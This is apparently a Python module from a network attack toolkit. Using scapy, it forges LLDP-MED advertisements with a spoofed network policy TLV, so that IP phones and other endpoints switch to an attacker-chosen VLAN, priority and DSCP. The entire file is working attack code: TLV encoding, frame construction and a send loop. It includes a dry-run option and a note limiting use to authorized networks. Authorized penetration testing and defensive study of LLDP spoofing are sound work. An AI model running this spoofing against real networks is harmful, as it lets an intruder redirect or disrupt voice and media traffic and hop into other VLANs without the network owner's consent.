"""LLDP-MED policy spoofing: advertise a fake network policy for a voice or media application.

LLDP-MED (ANSI/TIA-1057) lets a network device tell an endpoint, such as an IP phone, which
VLAN, Layer 2 priority and DSCP to use for an application. The policy is sent in LLDP frames
and is not authenticated. An endpoint that accepts a policy from any port moves its traffic
to the VLAN and priority the frame names.

This module builds an LLDP frame with the mandatory TLVs, the LLDP-MED capabilities TLV and a
network policy TLV, and sends it from the operator's interface. The effect to measure is the
policy a receiver stores, and whether it would apply that policy to an endpoint.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

LLDP_MAC = "01:80:c2:00:00:0e"       # nearest bridge group address
LLDP_ETHERTYPE = 0x88CC
TIA_OUI = b"\x00\x12\xbb"            # TIA organizationally unique identifier
MED_CAPABILITIES_SUBTYPE = 0x01
MED_NETWORK_POLICY_SUBTYPE = 0x02
MED_DEVICE_CLASS_NETWORK = 0x04      # network connectivity device
MED_CAPABILITIES_FLAGS = 0x000F      # capabilities, network policy, location, extended power
TLV_END = 0
TLV_CHASSIS_ID = 1
TLV_PORT_ID = 2
TLV_TTL = 3
TLV_ORG_SPECIFIC = 127
MAX_VLAN = 4094
MAX_FRAMES = 100
DEFAULT_TTL = 120
PORT_ID = b"GigabitEthernet0/1"

# Application types from TIA-1057, table 'Application Type' (1 to 8).
APPLICATION_TYPES = {
    "voice": 1,
    "voice-signaling": 2,
    "guest-voice": 3,
    "guest-voice-signaling": 4,
    "softphone-voice": 5,
    "video-conferencing": 6,
    "streaming-video": 7,
    "video-signaling": 8,
}


def _tlv(kind: int, value: bytes) -> bytes:
    """A TLV header is 7 bits of type and 9 bits of length, in one 16-bit field."""
    if len(value) > 511:
        raise ValueError("TLV value is too long.")
    return struct.pack("!H", (kind << 9) | len(value)) + value


def network_policy_value(application: int, tagged: bool, vlan_id: int, priority: int, dscp: int) -> bytes:
    """Network policy TLV value after the OUI and subtype: application type, then 24 bits.

    The 24 bits are U (unknown), T (tagged), X (reserved), VLAN ID (12 bits), L2 priority (3 bits)
    and DSCP (6 bits). Layout checked against lldpd's decoder: VLAN 10, priority 5, DSCP 46.
    """
    word = (int(tagged) << 22) | (vlan_id << 9) | (priority << 6) | dscp
    return bytes([application]) + word.to_bytes(3, "big")


@dataclass(frozen=True)
class LldpMedPolicySpoofingConfig:
    iface: str                          # attacker interface, on the segment with the receiver
    source_mac: str                     # the advertised chassis MAC (required)
    application: str = "voice"          # application type name, see APPLICATION_TYPES
    tagged: bool = True                 # the endpoint should send tagged frames
    vlan_id: int = 10                   # VLAN the endpoint should use; 0 when untagged
    priority: int = 5                   # Layer 2 priority, 0 to 7
    dscp: int = 46                      # DSCP value, 0 to 63
    system_name: str = "MACabre-SW"     # name of the forged device
    ttl: int = DEFAULT_TTL              # seconds a receiver keeps the neighbor
    frames: int = 1                     # advertisements to send
    interval: float = 1.0               # seconds between advertisements
    dry_run: bool = False               # build advertisements but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if self.application not in APPLICATION_TYPES:
            raise ValueError(f"Application must be one of: {', '.join(APPLICATION_TYPES)}.")
        if self.tagged:
            if not 1 <= self.vlan_id <= MAX_VLAN:
                raise ValueError(f"VLAN must be between 1 and {MAX_VLAN} for a tagged policy.")
        elif self.vlan_id != 0:
            raise ValueError("VLAN must be 0 for an untagged policy.")
        if not 0 <= self.priority <= 7:
            raise ValueError("Priority must be between 0 and 7.")
        if not 0 <= self.dscp <= 63:
            raise ValueError("DSCP must be between 0 and 63.")
        if not self.system_name or len(self.system_name.encode("ascii", "replace")) > 255:
            raise ValueError("System name must be 1 to 255 ASCII characters.")
        if not 0 <= self.ttl <= 65535:
            raise ValueError("TTL must be between 0 and 65535 seconds.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class LldpMedPolicySpoofingStats:
    frames: int = 0
    status: str = ""


def lldp_med_payload(config: LldpMedPolicySpoofingConfig) -> bytes:
    """LLDP data unit with mandatory TLVs, the MED capabilities TLV and the policy TLV."""
    chassis = bytes.fromhex(normalize_unicast_mac(config.source_mac).replace(":", ""))
    return b"".join([
        _tlv(TLV_CHASSIS_ID, b"\x04" + chassis),
        _tlv(TLV_PORT_ID, b"\x05" + PORT_ID),
        _tlv(TLV_TTL, struct.pack("!H", config.ttl)),
        _tlv(TLV_ORG_SPECIFIC, TIA_OUI + bytes([MED_CAPABILITIES_SUBTYPE])
             + struct.pack("!HB", MED_CAPABILITIES_FLAGS, MED_DEVICE_CLASS_NETWORK)),
        _tlv(TLV_ORG_SPECIFIC, TIA_OUI + bytes([MED_NETWORK_POLICY_SUBTYPE])
             + network_policy_value(APPLICATION_TYPES[config.application], config.tagged,
                                    config.vlan_id, config.priority, config.dscp)),
        _tlv(TLV_END, b""),
    ])


def build_policy_frame(config: LldpMedPolicySpoofingConfig) -> Packet:
    """Ethernet frame with the LLDP-MED payload, sent to the nearest bridge address."""
    return Ether(src=normalize_unicast_mac(config.source_mac), dst=LLDP_MAC, type=LLDP_ETHERTYPE) / Raw(
        lldp_med_payload(config)
    )


def run_lldp_med_policy_spoofing(
    config: LldpMedPolicySpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LldpMedPolicySpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> LldpMedPolicySpoofingStats:
    """Send the advertisements, waiting `interval` between them, unless `stop_event` is set."""
    send = send or sendp

    if config.dry_run:
        stats = LldpMedPolicySpoofingStats(
            status=(
                f"Dry run: would send {config.frames} LLDP-MED advertisement(s) with a {config.application} policy "
                f"(VLAN {config.vlan_id}, priority {config.priority}, DSCP {config.dscp}). Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = LldpMedPolicySpoofingStats()
    frame = build_policy_frame(config)
    for index in range(config.frames):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if index < config.frames - 1 and stop_event.wait(config.interval):
            break
    return stats
